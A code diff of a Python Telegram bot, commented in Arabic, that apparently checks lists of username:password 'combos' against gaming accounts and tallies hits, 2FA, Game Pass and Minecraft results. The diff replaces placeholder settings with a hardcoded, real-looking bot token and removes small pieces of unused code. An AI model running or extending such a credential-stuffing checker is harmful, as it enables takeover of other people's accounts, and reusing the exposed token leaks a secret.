@@ -9,7 +9,6 @@ import time
 import requests
 import re
 import threading
-import queue
 from urllib.parse import urlparse, parse_qs
 import urllib3
 from requests.adapters import HTTPAdapter
@@ -20,8 +19,7 @@ from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, Messa
 urllib3.disable_warnings()
 
 # =================== الإعدادات العامة ===================
-BOT_TOKEN = "ضع_توكن_البوت_هنا"  # ضع توكن بوت التيليجرام الخاص بك هنا
-ADMIN_CHAT_ID = "ضع_آيدي_المشرف_هنا"  # آيدي حسابك لكي يرسل لك النتائج
+BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
 
 checked = 0
 total_combos = 0
@@ -136,7 +134,7 @@ def extract_url_post(text):
     return None
 
 def check_account(combo, bot_app, chat_id):
-    global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, account_counter, is_horn_running
+    global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, account_counter
 
     parts = combo.split(':')
     if len(parts) < 2:
@@ -344,7 +342,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             concurrent.futures.as_completed(futures)
         is_running = False
         
-        # إرسال تقرير الانتهاء
         try:
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                 "chat_id": update.effective_chat.id,
